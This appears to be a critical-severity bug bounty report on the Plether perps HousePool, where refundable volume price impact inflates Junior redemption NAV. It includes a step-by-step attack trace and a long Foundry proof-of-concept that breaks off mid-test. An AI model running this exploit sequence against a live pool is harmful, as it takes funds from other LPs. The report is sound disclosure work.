# \#98024 [SC-Critical] Refundable VPI inflates Junior redemption NAV before the trader reclaims it, letting a Junior LP/trader extract USDG from other Junior LPs

**Submitted on Nov 4th 2026 at 13:27:21 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98024
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A skew-increasing open pays a volume price impact charge (VPI) into the HousePool, and the pool books it as realised revenue immediately: the next LP epoch prices Junior deposits and redemptions at a NAV that includes it. The charge is not final, though. When the same position closes and the skew returns, the lifetime clamp converts the close-side VPI into a rebate of up to the amount originally paid, and the engine pays that rebate back out of pool cash. For the life of the position the pool therefore counts a refundable deposit as LP equity.

Any Junior whose redemption settles while such a position is open is overpaid by its share of the VPI, and the Juniors who remain fund the refund at close. A Junior LP who also trades can force this: request a full redemption, open at the skew cap after the epoch's request cutoff, settle at the inflated NAV, close immediately and reclaim the VPI. The trading leg is VPI-neutral, so the result is a transfer from other Juniors to the attacker.  The protocol already excludes the mirror-image negative-VPI reserve from LP pricing; positive refundable VPI has no such exclusion.

## Vulnerability Details
**Code path.** `V = vpiFactor · (S_post² − S_pre²) / (2D)`; at the release `vpiFactor` (0.01e18) an open from flat to the 40% skew cap pays 20 bps of notional.

1. `CfdEngineSettlementSidecar.executeOpen` (L452-463) sends V to the pool as a `Revenue` inflow; `HousePool` adds it to `accountedAssets` (L641).
2. `HousePoolAccountingLib.buildReconcileSnapshot` (L60-81) prices shares from `physicalAssets + terminalLpPriceDelta − traderClaims`. No term excludes VPI that can still be refunded, so the epoch settlement (`HousePool.sol` L840) runs at a NAV higher by V, and the surplus lands in the Junior tranche (`HousePoolWaterfallAccountingLib.sol` L158).
3. On close, `CloseAccountingLib.buildCloseState` computes a negative VPI; the lifetime clamp (L112-118) limits it to the V already paid, `CfdEnginePlanLib._planCloseActionSettlement` (L1041-1060) nets it into a rebate, and `_executeClose` (L621-623) pays it from pool cash, capped only by pool cash net of trader claims (L973-977).

The clamp exists to stop the trader-side sandwich (comment at `CloseAccountingLib.sol` L112-114), and WHITEPAPER L887-888 keeps the negative-VPI reserve out of the terminal price curve "so LPs cannot withdraw it as marked equity before the matching position obligation settles". The positive side is the gap.

**Attack trace** (`LP_RefundableVpiNavExtraction.t.sol`, release parameters, production V3 `router.commitOrder` path, measured against a no-attack control from the same snapshot and clock). Senior 4,000,000; Junior 6,000,000 = 3,600,000 attacker (share f = 0.6) + 2,400,000 honest Junior.

1. Attacker requests a full Junior redemption early in an epoch.
2. 120 s before maturity, after the request cutoff, it opens LONG at the skew cap (40,008 lots, N = 4,000,800). V = 8,001.60; open fee 1,600.32 to treasury; Junior `totalAssets` rises by V.
3. Anyone calls `router.settleLpEpoch`. The redemption is funded with 3,604,756.31 instead of 3,599,956.15: an uplift of 4,800.16 = f · V.
4. Attacker closes at the same price. The clamp binds and the rebate is 6,401.28 = V − close fee, paid in full from pool cash.
5. Net versus control: attacker +1,599.22 (f·V minus two execution fees and 0.30 carry); honest Junior −3,198.22; Senior unchanged. At the 10 bps Pyth confidence ceiling the attacker still nets +196.44 and the honest Junior loses 1,795.62.

The loss is realised in tokens, not only in a preview: in the next epoch the honest Junior claims a fixed quarter of its shares and receives 599,174.878600 USDG instead of 599,974.430400, a shortfall of 799.551800 USDG (`test_Attack_VictimClaimsLessUsdgOnLaterFundedRedemption`, public `requestRedeem` / `settleLpEpoch` / `claimRedeem` only).

**Variants and constraints** (`Skeptic_RefundableVpiVariants.t.sol`).
- The precondition is capital, not an existing share: Junior deposits are uncapped. Depositing 14,000,000 into an honest 6,000,000 / 4,000,000 pool (f = 0.78) gives +7,252.38 / −11,089.94 per cycle, 0.28% of the honest tranche (`test_C2`); +4,311 / −8,149 at the confidence ceiling. Under the Senior covenant inside an existing 60/40 tranche (f ≈ 0.625) it is +1,778.81 / −3,376.91 (`test_C1b`).
- Break-even is f ≈ 0.40 (0.58 at the confidence ceiling), lower when same-side skew already exists. Below it the attack is pure griefing: at f = 0.30 the attacker loses 800.86 and the victim still loses 799.28 (`test_B`).
- Passive case, no attacker: an unrelated trader holds a skew-cap position across settlement and an honest 60% Junior redeems; it is overpaid 4,800.16 and the remaining Junior loses 3,198.22 (`test_A`).
- The rebate is the same with or without a redemption (6,394.88 vs 6,401.28, `test_D`), so the harm comes from NAV booking V as revenue, not from depth manipulation.
- Cycle time is about 3 h (deposit activation + redemption cooldown + epoch funding, `test_E`). No guard interrupts the path: `NoLpEpochProgress` needs an empty queue, the close is skew-reducing, the rebate cap is pool cash minus claims, degraded mode is not reached, posted margin is refunded.
## Impact Details
Direct theft of Junior LP deposits by an unprivileged actor: per cycle about 20·f − 8 bps of max-skew notional to the attacker, and that plus the open fee lost by the other Juniors (measured up to +7,252 / −11,090 USDG with 14M of attacker capital, +4,311 / −8,149 at the confidence ceiling; 799.55 USDG fewer tokens paid on an honest Junior's later claim in the 3.6M/2.4M case). Repeatable roughly every 3 hours. Below break-even it is still griefing (victim loses while the attacker pays). Without any attacker, every Junior redemption settled while a skew-increasing position is open is overpaid by its share of that position's refundable VPI (up to 8 bps of pool depth) at the remaining Juniors' expense.



## Proof of Concept

## Proof of Concept

Save the attached file as `packages/perps/test/poc/PoC_RefundableVpiNavExtraction.t.sol` in a checkout at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It holds two test contracts (12 tests): `RefundableVpiNavExtractionTest` (control, attack, the victim's later USDG claim, attack at max confidence) and `RefundableVpiVariantsTest` (passive variant, 30% share, 60/40 mixes, attacker-supplied capital, no-redemption rebate control, cycle timing). It runs in the repository's Foundry suite with its own `BasePerpTest`; no file under `src/` is modified; mocks replace only Pyth (MockPyth) and USDG (MockSettlementToken). All trades go through the production V3 `router.commitOrder(OrderRequest)` path and the permissionless `router.settleLpEpoch` path.

```bash
cd packages/perps
forge test --match-path 'test/poc/PoC_RefundableVpiNavExtraction.t.sol' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";
// ─────────────────────────────────────────────────────────────────────────────
// Single-file PoC: refundable VPI counted in Junior LP NAV (Plether perps, commit a82d4fef).
// Place at packages/perps/test/poc/PoC_RefundableVpiNavExtraction.t.sol and run:
//   cd packages/perps && forge test --match-path 'test/poc/PoC_RefundableVpiNavExtraction.t.sol' -vv
// Two test contracts, 12 tests, nothing under src/ modified:
//   PART 1  RefundableVpiNavExtractionTest  — control, attack, victim's later USDG claim, attack at max confidence
//   PART 2  RefundableVpiVariantsTest       — passive variant, 30% share, 60/40 mixes, attacker-supplied capital,
//                                             no-redemption rebate control, cycle timing
// ─────────────────────────────────────────────────────────────────────────────

/// @notice PART 1 — PoC: REFUNDABLE VPI COUNTED AS LP NAV.
///         A skew-increasing open pays VPI V into HousePool as `Revenue/CashArrived`
///         (CfdEngineSettlementSidecar.executeOpen -> recordClaimantInflow). LP pricing
///         (HousePoolAccountingLib.buildReconcileSnapshot = physical + terminal price delta - trader claims) has no VPI
///         term, so V is distributed to tranche principals at the next reconcile. The same position's skew-reducing
///         close is rebated up to its lifetime VPI (CloseAccountingLib lifetime clamp) from free pool cash
///         (CfdEnginePlanLib._planIsolatedCloseSettlement). An attacker who is both a Junior LP (fraction f) and the
///         trader requests a full Junior redemption, opens at the skew cap just before the LP epoch boundary, gets
///         redeemed at a NAV that includes V, then closes and is refunded V by the remaining LPs.
/// @dev Release parameters: vpiFactor 0.01e18, maxSkewRatio 0.4e18, maint 10 bps, IM 20 bps, execution fee 4 bps,
///      settlement buffer 25 bps, bountyBps 10, minOpenNotional 1,000 USDG, adverseConfidenceMultiplierBps 2500,
///      Senior cap 40M / maxSeniorShareBps 8000, baseCarryBps 500, seniorRateBps 800.
contract RefundableVpiNavExtractionTest is BasePerpTest {

    address internal constant ATTACKER = address(0xA77AC4); // Junior LP (~60%) and trader
    address internal constant VICTIM = address(0x71C7144); // honest Junior LP (~40%)
    address internal constant SAM = address(0x5A11); // honest Senior LP

    uint256 internal constant SENIOR_ASSETS = 4_000_000e6;
    uint256 internal constant ATK_JUNIOR_ASSETS = 3_600_000e6;
    uint256 internal constant VIC_JUNIOR_ASSETS = 2_400_000e6;
    uint256 internal constant ATK_TRADER_DEPOSIT = 100_000e6;
    uint256 internal constant ORDER_MARGIN = 40_000e6; // 1% of ~4M notional; refundable, irrelevant to economics
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint64 internal constant MAX_CONF = 100_000; // 10 bps of a 1.00 mark = basketMaxConfidenceRatioBps

    bytes32 internal constant ACTION_REBATE_SETTLED = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");

    struct Cycle {
        // LP and wealth valuations (6dp USDG)
        uint256 attackerStart;
        uint256 attackerEnd;
        uint256 victimStart;
        uint256 victimAfterSettle;
        uint256 victimEnd;
        uint256 juniorTotalBeforeOpen;
        uint256 juniorTotalAfterOpen;
        uint256 juniorSupply;
        uint256 victimShares;
        uint256 attackerShares;
        uint256 attackerQuoteAtSettle;
        uint256 attackerFunded;
        uint256 treasuryStart;
        uint256 treasuryAfterOpen;
        uint256 treasuryEnd;
        uint256 seniorStart;
        uint256 seniorEnd;
        // open
        uint256 lots;
        uint256 notional;
        uint256 depthAtOpen;
        uint256 maxSkewAtOpen;
        uint8 nextLotRevertCode;
        uint256 entryPrice;
        uint256 vpiCharged;
        uint256 feeOpen;
        uint256 lAfterOpen;
        uint256 bAfterOpen;
        uint256 eAfterOpen;
        // close
        uint256 depthAtClose;
        int256 rawCloseVpi;
        uint256 feeClose;
        uint256 rebateAssessed;
        uint256 rebatePaid;
        uint256 rebateWaived;
        bool rebateEventSeen;
        uint256 freeCashBeforeClose;
        uint256 attackerChBeforeClose;
        uint256 attackerChAfterClose;
        uint256 poolBeforeClose;
        uint256 poolAfterClose;
    }

    struct VictimExit {
        uint256 requestId;
        uint256 maturity;
        uint256 requestedShares;
        uint256 claimedShares;
        uint256 paidAssets;
        uint256 walletBefore;
        uint256 walletAfter;
        uint256 residualShares;
        uint256 residualValue;
        uint256 seniorAssetsAtClaim;
    }

    // ------------------------------------------------------------------ configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: VPI_FACTOR,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // Propose both timelocked configs together so one 72h wait lands on Thursday (not the weekend closure).
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500; // release value
        config.minOpenNotionalAssets = 1000e6; // release value
        routerAdmin.proposeRouterConfig(config);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6; // release Senior covenant
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        uint256 activation = vm.getBlockTimestamp() + 72 hours + 1;
        if (pool.poolConfigActivationTime() > activation) {
            activation = pool.poolConfigActivationTime();
        }
        vm.warp(activation);
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();
        assertFalse(engine.isOracleFrozen(), "weekday setup");

        _fundJunior(ATTACKER, ATK_JUNIOR_ASSETS);
        _fundJunior(VICTIM, VIC_JUNIOR_ASSETS);
        _fundSenior(SAM, SENIOR_ASSETS);
        uint256 unlock = juniorVault.lastDepositTime(VICTIM) + juniorVault.DEPOSIT_COOLDOWN();
        uint256 unlockAtk = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (unlockAtk > unlock) {
            unlock = unlockAtk;
        }
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock + 1);
        }
        _fundTrader(ATTACKER, ATK_TRADER_DEPOSIT);
        _refreshMark(PRICE);
    }

    // ------------------------------------------------------------------ oracle helpers

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
        router.updateMarkPrice(_livePriceData(price));
    }

    /// @dev Real permissionless Router path (same as Engine_HedgedCapacitySquat). With no open position the pool
    ///      entrypoint is permissionless, so fall back to it if the Router path rejects.
    function _settleEpoch(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
        bytes[] memory data = _livePriceData(price);
        try router.settleLpEpoch(data) {}
        catch (bytes memory err) {
            if (_sideOpenInterest(CfdTypes.Side.LONG) + _sideOpenInterest(CfdTypes.Side.SHORT) != 0) {
                assembly ("memory-safe") {
                    revert(add(err, 32), mload(err))
                }
            }
            pool.settleLpEpoch(0, 0);
        }
    }

    /// @dev Legacy execution blob, optionally with a nonzero Pyth confidence on both basket components.
    function _execData(
        uint256 price,
        uint64 conf
    ) internal returns (bytes[] memory data) {
        data = _mockPythUpdateData(price);
        if (conf != 0) {
            uint256 publishTime = _mockHistoricalPublishTime();
            baseMockPyth.setAllUniquePrices(
                _basePythFeedIds(),
                int64(uint64(price)),
                conf,
                int32(-8),
                publishTime,
                publishTime == 0 ? 0 : publishTime - 1
            );
        }
    }

    function _exec(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price,
        uint64 conf
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ATTACKER);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _execData(price, conf);
        vm.roll(vm.getBlockNumber() + 1);
        // Self-execution (keepers are permissionless): the open-order execution bounty returns to the attacker.
        vm.prank(ATTACKER);
        r = router.executeOrder(id, data);
    }

    // ------------------------------------------------------------------ view helpers

    function _previewCode(
        uint256 lots,
        uint256 margin,
        uint256 price
    ) internal view returns (uint8) {
        try engineLens.previewOpenRevertCode(
            ATTACKER, CfdTypes.Side.LONG, lots * CfdTypes.SIZE_QUANTUM, margin, price
        ) returns (uint8 code) {
            return code;
        } catch {
            return type(uint8).max;
        }
    }

    function _maxAdmissibleLots(
        uint256 margin,
        uint256 price
    ) internal view returns (uint256) {
        uint256 lo;
        uint256 hi = 200_000;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            if (_previewCode(mid, margin, price) == 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        return lo;
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    /// @dev Clearinghouse settlement balance + wallet USDG + mark value of wallet Junior shares.
    function _wealth(
        address a
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + settlementToken.balanceOf(a) + _juniorValue(a);
    }

    function _economicDepth() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    // ------------------------------------------------------------------ the cycle

    function _openAtSkewCap(
        Cycle memory c,
        uint64 conf
    ) internal {
        c.depthAtOpen = _economicDepth();
        c.maxSkewAtOpen = (c.depthAtOpen * 0.4e18) / 1e18;
        c.lots = _maxAdmissibleLots(ORDER_MARGIN, PRICE);
        c.nextLotRevertCode = _previewCode(c.lots + 1, ORDER_MARGIN, PRICE);
        c.notional = c.lots * PRICE; // size * price / 1e20 with size = lots * 1e20
        uint256 tBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        OrderV3Types.ExecutionResult memory r =
            _exec(CfdTypes.Side.LONG, c.lots * CfdTypes.SIZE_QUANTUM, ORDER_MARGIN, false, PRICE, conf);
        if (r.status != OrderV3Types.LifecycleStatus.Executed) {
            emit log_named_uint("open terminal reason", uint8(r.terminalReason));
        }
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "skew-cap open executed");
        int256 vpi;
        (,, c.entryPrice,,,, vpi) = engine.positions(ATTACKER);
        assertGt(vpi, 0, "open paid positive VPI");
        c.vpiCharged = uint256(vpi);
        c.treasuryAfterOpen = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        c.feeOpen = c.treasuryAfterOpen - tBefore;
        c.lAfterOpen = _maxLiability();
        c.bAfterOpen = (c.lAfterOpen * engine.settlementBufferBps() + 9999) / 10_000;
        c.eAfterOpen = _economicDepth();
    }

    function _closeAll(
        Cycle memory c,
        uint64 conf
    ) internal {
        (uint256 size,,,,,,) = engine.positions(ATTACKER);
        c.depthAtClose = _economicDepth();
        c.rawCloseVpi = CfdMath.calculateVPI((size * PRICE) / 1e20, 0, c.depthAtClose, VPI_FACTOR);
        c.freeCashBeforeClose = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        c.poolBeforeClose = pool.totalAssets();
        c.attackerChBeforeClose = clearinghouse.balanceAssets(ATTACKER);
        vm.recordLogs();
        OrderV3Types.ExecutionResult memory r = _exec(CfdTypes.Side.LONG, size, 0, true, PRICE, conf);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        if (r.status != OrderV3Types.LifecycleStatus.Executed) {
            emit log_named_uint("close terminal reason", uint8(r.terminalReason));
        }
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "full close executed");
        (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER);
        assertEq(sizeAfter, 0, "position fully closed");
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].topics.length == 2 && logs[i].topics[0] == ACTION_REBATE_SETTLED
                    && address(uint160(uint256(logs[i].topics[1]))) == ATTACKER
            ) {
                (c.rebateAssessed, c.rebatePaid, c.rebateWaived) =
                    abi.decode(logs[i].data, (uint256, uint256, uint256));
                c.rebateEventSeen = true;
            }
        }
        c.poolAfterClose = pool.totalAssets();
        c.attackerChAfterClose = clearinghouse.balanceAssets(ATTACKER);
        // Close fee on closed notional at the (adverse) execution price; mirrors CloseAccountingLib.
        uint256 shift = PRICE > c.entryPrice ? PRICE - c.entryPrice : 0;
        c.feeClose = ((size * (PRICE + shift)) / 1e20) * engine.executionFeeBps() / 10_000;
    }

    function _idle() internal {
        vm.roll(vm.getBlockNumber() + 2);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _runCycle(
        bool attack,
        uint64 conf
    ) internal returns (Cycle memory c) {
        // Start one minute into a fresh LP epoch so the request targets the imminent epoch (cutoff is 5 minutes).
        uint256 epochStart = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epochStart + 60);
        _refreshMark(PRICE);
        c.victimStart = _juniorValue(VICTIM);
        c.attackerStart = _wealth(ATTACKER);
        c.treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        c.seniorStart = seniorVault.totalAssets();
        c.juniorSupply = juniorVault.accruedTotalSupply();
        c.victimShares = juniorVault.balanceOf(VICTIM);

        // 1. Attacker (Junior LP) requests a full Junior redemption maturing at the next LP epoch.
        c.attackerShares = juniorVault.maxRequestRedeem(ATTACKER);
        assertEq(c.attackerShares, juniorVault.balanceOf(ATTACKER), "full balance requestable");
        vm.prank(ATTACKER);
        uint256 reqId = juniorVault.requestRedeem(c.attackerShares, ATTACKER, ATTACKER);
        uint256 maturity = pool.lpEpochStart(reqId);
        assertEq(maturity, epochStart + 1 hours, "request targets the imminent epoch");

        // 2. Two minutes before maturity: skew-increasing LONG at the 40% skew cap (attack only).
        vm.warp(maturity - 120);
        _refreshMark(PRICE);
        c.juniorTotalBeforeOpen = juniorVault.totalAssets();
        if (attack) {
            _openAtSkewCap(c, conf);
        } else {
            _idle();
        }
        _refreshMark(PRICE);
        c.juniorTotalAfterOpen = juniorVault.totalAssets();

        // 3. Permissionless LP epoch settlement at maturity, same price.
        vm.warp(maturity);
        _settleEpoch(PRICE);
        c.attackerFunded = juniorVault.maxWithdraw(ATTACKER);
        c.attackerQuoteAtSettle = juniorVault.convertToAssets(c.attackerShares);
        c.victimAfterSettle = _juniorValue(VICTIM);
        assertEq(juniorVault.maxRedeem(ATTACKER), c.attackerShares, "attacker redemption fully funded");
        vm.prank(ATTACKER);
        juniorVault.withdraw(c.attackerFunded, ATTACKER, ATTACKER);

        // 4. Attacker closes the whole position at the same price (attack only).
        if (attack) {
            _closeAll(c, conf);
        } else {
            _idle();
        }

        // 5. Final valuation at the same mark.
        _refreshMark(PRICE);
        c.victimEnd = _juniorValue(VICTIM);
        c.attackerEnd = _wealth(ATTACKER);
        c.treasuryEnd = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        c.seniorEnd = seniorVault.totalAssets();
    }

    /// @dev Follow the victim's actual async redemption through the next LP epoch. The same fixed share amount is
    ///      claimed in each snapshot branch, so the USDG wallet delta is the directly realized loss on that tranche.
    function _redeemVictimTranche(
        uint256 shares
    ) internal returns (VictimExit memory x) {
        x.requestedShares = shares;
        x.walletBefore = settlementToken.balanceOf(VICTIM);
        uint256 epochStart = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        vm.warp(epochStart + 60);
        _refreshMark(PRICE);
        assertGe(juniorVault.maxRequestRedeem(VICTIM), shares, "victim can request fixed tranche");
        vm.prank(VICTIM);
        x.requestId = juniorVault.requestRedeem(shares, VICTIM, VICTIM);
        x.maturity = pool.lpEpochStart(x.requestId);
        assertEq(x.maturity, epochStart + 1 hours, "victim request targets next epoch");

        vm.warp(x.maturity);
        _settleEpoch(PRICE);
        x.claimedShares = juniorVault.claimableRedeemRequest(x.requestId, VICTIM);
        assertEq(x.claimedShares, shares, "fixed victim tranche fully funded");
        assertGt(juniorVault.claimableRedeemAssets(x.requestId, VICTIM), 0, "victim has funded USDG claim");
        vm.prank(VICTIM);
        x.paidAssets = juniorVault.claimRedeem(x.requestId, x.claimedShares, VICTIM, VICTIM);
        x.walletAfter = settlementToken.balanceOf(VICTIM);
        assertEq(x.walletAfter - x.walletBefore, x.paidAssets, "victim actually receives claimed USDG");
        assertEq(juniorVault.claimableRedeemRequest(x.requestId, VICTIM), 0, "claim fully consumed");
        x.residualShares = juniorVault.balanceOf(VICTIM);
        x.residualValue = _juniorValue(VICTIM);
        x.seniorAssetsAtClaim = seniorVault.totalAssets();
    }

    // ------------------------------------------------------------------ logging

    function _logCycle(
        string memory tag,
        Cycle memory c
    ) internal {
        emit log_string(tag);
        emit log_named_decimal_uint("  attacker wealth start (CH + wallet + Junior value)", c.attackerStart, 6);
        emit log_named_decimal_uint("  attacker wealth end", c.attackerEnd, 6);
        emit log_named_decimal_int("  attacker wealth delta", int256(c.attackerEnd) - int256(c.attackerStart), 6);
        emit log_named_decimal_uint("  victim Junior value start", c.victimStart, 6);
        emit log_named_decimal_uint("  victim Junior value right after settlement", c.victimAfterSettle, 6);
        emit log_named_decimal_uint("  victim Junior value end", c.victimEnd, 6);
        emit log_named_decimal_int("  victim Junior value delta", int256(c.victimEnd) - int256(c.victimStart), 6);
        emit log_named_decimal_uint("  Junior totalAssets before open", c.juniorTotalBeforeOpen, 6);
        emit log_named_decimal_uint("  Junior totalAssets after open (pending reconcile)", c.juniorTotalAfterOpen, 6);
        emit log_named_decimal_uint("  attacker redemption funded", c.attackerFunded, 6);
        emit log_named_decimal_uint("  attacker shares quoted at settlement NAV", c.attackerQuoteAtSettle, 6);
        emit log_named_decimal_int("  Senior totalAssets delta (coupon)", int256(c.seniorEnd) - int256(c.seniorStart), 6);
        emit log_named_decimal_uint("  protocol treasury delta", c.treasuryEnd - c.treasuryStart, 6);
    }

    function _logTrade(
        Cycle memory c
    ) internal {
        emit log_string("== trade economics ==");
        emit log_named_decimal_uint("  economic depth at open D", c.depthAtOpen, 6);
        emit log_named_decimal_uint("  40% skew cap at open", c.maxSkewAtOpen, 6);
        emit log_named_uint("  max admissible LONG lots (100 USDG each)", c.lots);
        emit log_named_uint("  preview code for lots+1 (4 = SKEW_TOO_HIGH)", c.nextLotRevertCode);
        emit log_named_decimal_uint("  notional N", c.notional, 6);
        emit log_named_decimal_uint("  entry price (1e8)", c.entryPrice, 8);
        emit log_named_decimal_uint("  VPI charged V (lifetime vpiAccrued)", c.vpiCharged, 6);
        emit log_named_decimal_uint("  V/N (bps x100)", (c.vpiCharged * 1_000_000) / c.notional, 2);
        emit log_named_decimal_uint("  open fee (treasury delta)", c.feeOpen, 6);
        emit log_named_decimal_uint("  L after open", c.lAfterOpen, 6);
        emit log_named_decimal_uint("  B after open", c.bAfterOpen, 6);
        emit log_named_decimal_uint("  E after open", c.eAfterOpen, 6);
        emit log_named_decimal_uint("  E - L - B headroom after open", c.eAfterOpen - c.lAfterOpen - c.bAfterOpen, 6);
        emit log_named_decimal_uint("  economic depth at close", c.depthAtClose, 6);
        emit log_named_decimal_int("  raw close VPI at close depth (pre-clamp, -=rebate)", c.rawCloseVpi, 6);
        emit log_named_decimal_uint("  pool free cash (P - claims) before close", c.freeCashBeforeClose, 6);
        emit log_named_decimal_uint("  close fee (netted into rebate, stays in pool)", c.feeClose, 6);
        emit log_named_decimal_uint("  rebate assessed", c.rebateAssessed, 6);
        emit log_named_decimal_uint("  rebate paid", c.rebatePaid, 6);
        emit log_named_decimal_uint("  rebate waived", c.rebateWaived, 6);
        emit log_named_decimal_uint("  attacker CH balance delta at close", c.attackerChAfterClose - c.attackerChBeforeClose, 6);
        emit log_named_decimal_uint("  pool cash outflow at close", c.poolBeforeClose - c.poolAfterClose, 6);
        emit log_named_decimal_int(
            "  carry netted at close (rebate paid - CH credit)",
            int256(c.rebatePaid) - int256(c.attackerChAfterClose - c.attackerChBeforeClose),
            6
        );
    }

    // ------------------------------------------------------------------ tests

    /// @notice Control: the attacker only redeems. Victim value is unchanged apart from the Senior coupon, and the
    ///         attacker receives exactly its pro-rata Junior share.
    function test_Control_RedeemOnly_NoTransfer() public {
        Cycle memory c = _runCycle(false, 0);
        _logCycle("== CONTROL: redeem only, no trade ==", c);
        assertApproxEqAbs(c.attackerFunded, c.attackerQuoteAtSettle, 2, "attacker paid exactly its share");
        // Only the Senior coupon (8%/yr on ~4M for ~1h, ~37 USDG across all Juniors) moves Junior value.
        assertApproxEqAbs(c.victimEnd, c.victimStart, 25e6, "victim value unchanged up to the Senior coupon");
        assertApproxEqAbs(c.attackerEnd, c.attackerStart, 25e6, "attacker value unchanged up to the Senior coupon");
    }

    /// @notice Attack vs control from the same state: attacker profits by ~f*V - fees, the co-Junior victim loses
    ///         ~f*V - closeFee - carry.
    function test_Attack_RefundableVpiExtractsFromCoJunior() public {
        uint256 snap = vm.snapshotState();
        Cycle memory ctl = _runCycle(false, 0);
        _logCycle("== CONTROL (same state, same clock) ==", ctl);
        vm.revertToState(snap);

        Cycle memory atk = _runCycle(true, 0);
        _logCycle("== ATTACK: redeem request + skew-cap open before epoch, close after ==", atk);
        _logTrade(atk);

        // --- mechanism checks
        assertTrue(atk.rebateEventSeen, "ActionRebateSettled emitted");
        assertEq(atk.nextLotRevertCode, 4, "the 40% skew cap is the binding constraint");
